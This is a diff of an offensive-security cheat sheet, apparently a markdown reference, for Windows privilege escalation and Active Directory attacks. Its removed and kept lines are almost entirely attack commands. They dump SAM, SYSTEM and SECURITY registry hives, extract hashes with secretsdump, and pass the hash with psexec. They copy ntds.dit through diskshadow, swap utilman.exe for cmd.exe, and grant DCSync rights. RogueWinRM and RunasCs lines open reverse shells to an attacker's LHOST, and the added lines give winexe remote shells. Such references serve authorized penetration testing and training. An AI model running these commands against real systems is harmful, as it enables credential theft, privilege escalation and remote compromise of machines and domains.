-reg.exe save hklm\security c:\temp\security.save
-reg.exe save hklm\system c:\temp\system.save
-```
-
 #### Rubeus
 
 ##### Overpass the Hash
@@ -3491,136 +3807,11 @@ Rubeus.exe kerberoast /user:<USERNAME>
 ./RunasCs.exe -d <DOMAIN> "<USERNAME>" '<PASSWORD>' cmd.exe -r <LHOST>:<LPORT>
 ```
 
-#### SeBackup and SeRestore Privilege
-
-##### Backup SAM and SYSTEM Hashes
+#### winexe
 
 ```c
-reg save hklm\system C:\Users\<USERNAME>\system.hive
-reg save hklm\sam C:\Users\<USERNAME>\sam.hive
-```
-
-##### Dumping Hashes
-
-```c
-secretsdump.py -sam sam.hive -system system.hive LOCAL
-```
-
-##### Pass the Hash
-
-```c
-psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@<RHOST>
-```
-
-#### SeBackupPrivilege Privilege Escalation (diskshadow)
-
-> https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug
-
-##### Script for PowerShell Environment
-
-```c
-SET CONTEXT PERSISTENT NOWRITERSp
-add volume c: alias foobarp
-createp
-expose %foobar% z:p
-```
-
-```c
-diskshadow /s <FILE>.txt
-```
-
-##### Copy ntds.dit
-
-```c
-Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit
-```
-
-##### Export System Registry Value
-
-```c
-reg save HKLM\SYSTEM c:\temp\system
-```
-
-Download `ndts.dit` and system and get the hashes from `secretsdump.py` of the impacket-suite.
-
-#### SeTakeOwnership Privilege
-
-```c
-takeown /f C:\Windows\System32\Utilman.exe
-```
-
-```c
-icacls C:\Windows\System32\Utilman.exe /grant Everyone:F
-```
-
-```c
-C:\Windows\System32\> copy cmd.exe utilman.exe
-```
-
-Click the `Ease of Access` button on the logon screen to get a shell with `NT Authority\System` privileges.
-
-#### SeImpersonate and SeAssignPrimaryToken Privilege
-
-> https://github.com/antonioCoco/RogueWinRM
-
-```c
-.\RogueWinRM.exe -p "C:\> .\nc64.exe" -a "-e cmd.exe <LHOST> <LPORT>"
-```
-
-#### Unquoted Service Paths
-
-Search for `Unquoted Service Paths` by using `sc qc`.
-
-```c
-sc qc
-sc qc WindowsScheduler
-sc stop WindowsScheduler
-sc start WindowsScheduler
-```
-
-```c
-icacls <PROGRAM>.exe
-icacls C:\PROGRA~2\SYSTEM~1\<SERVICE>.exe
-icacls C:\PROGRA~2\SYSTEM~1\<SERVICE>.exe /grant Everyone:F
-```
-
-#### Windows Tasks & Services
-
-```c
-tasklist /SVC
-netsh firewall show state
-schtasks /query /fo LIST /v
-driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
-```
-
-```c
-sc query
-sc qc <service-name>
-accesschk.exe -uws "Everyone" "C:\Program Files"
-
-dir /s *pass* == *cred* == *vnc* == *.config*
-findstr /si password *.xml *.ini *.txt
-
-wmic qfe get Caption,Description,HotFixID,InstalledOn    # no new patches - KEXP pretty likely
-```
-
-#### Writeable Directories in Linux
-
-```c
-/dev/shm
-/tmp
-```
-
-#### writeDACL
-
-> https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/
-
-##### Usage
-
-```c
-$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword)
-Add-ObjectACL -PrincipalIdentity <USERNAME> -Credential $Cred -Rights DCSync
+winexe -U '<USERNAME%PASSWORD>' //<RHOST> cmd.exe
+winexe -U '<USERNAME%PASSWORD>' --system //<RHOST> cmd.exe
 ```
 
 ### CVE
